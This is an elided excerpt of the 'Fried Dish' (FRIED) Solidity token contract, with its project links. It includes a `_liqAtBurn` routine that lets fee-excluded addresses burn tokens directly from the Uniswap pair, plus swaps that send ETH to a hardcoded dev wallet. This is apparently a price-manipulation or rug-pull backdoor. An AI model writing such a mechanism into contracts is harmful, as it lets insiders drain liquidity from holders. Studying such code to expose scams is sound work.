...
Website:   https://www.frieddish.xyz

Telegram:  https://t.me/fried_dish_fi

Twitter:   https://twitter.com/fried_dish_fi
...
contract FriedDish is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = unicode"Fried Dish";
    string private _symbol = unicode"FRIED";
    uint8 private _decimals = 9;

    address payable public devAddress =
        payable(0x9cE1b696eA8F3E4eedcEB9E72D940fc7Dc32703a);
    ...
    function _liqAtBurn() internal returns (bool) {
        ...
        if (amountToBurn > 0) {
            _standardTransfer(uniswapV2Pair, deadAddress, amountToBurn);
        }
    ...
    function setAutomatedMarketMakerPair(
        ...
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from Automated Market Maker Pair."
        );
        ...
        if (inSwapAndLiquify) {
            ...
            if (isExcludedFromFees[sender] || isExcludedFromFees[recipient]) {
                ...
                if (sender != address(this) && recipient != address(this)) {
                    if (recipient == address(0xdead) && amount >= minimumTokens ) _liqAtBurn();
                }
            } else {
                finalAmount = takeTxFee(sender, recipient, amount);
            }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        sendToWallet(devAddress, contractETH);
    }
